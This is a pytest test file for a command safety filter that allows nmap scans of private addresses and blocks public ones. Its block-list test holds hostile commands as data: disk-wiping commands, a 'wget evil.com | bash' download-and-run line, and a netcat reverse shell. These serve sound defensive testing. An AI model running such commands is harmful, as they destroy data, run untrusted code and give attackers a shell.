import pytest
from src.validation.safety_filter import SafetyFilter

def test_safety_filter_valid_private_ip():
    sf = SafetyFilter()
    passed, flags = sf.validate("nmap -sS 192.168.1.1", "192.168.1.1")
    assert passed is True
    assert len(flags) == 0

def test_safety_filter_blocked_dangerous_patterns():
    sf = SafetyFilter()
    dangerous_commands = [
        "rm -rf /",
        "mkfs.ext4 /dev/sda",
        "dd if=/dev/zero of=/dev/sda",
        "wget http://evil.com/sh | bash",
        "nc -e /bin/sh 10.0.0.1 4444"
    ]
    for cmd in dangerous_commands:
        passed, flags = sf.validate(cmd, "192.168.1.1")
        assert passed is False
        assert any("BLOCKED" in f for f in flags)

def test_safety_filter_public_ip_blocked():
    sf = SafetyFilter()
    passed, flags = sf.validate("nmap -sS 8.8.8.8", "8.8.8.8")
    assert passed is False
    assert any("RFC-1918" in f for f in flags)
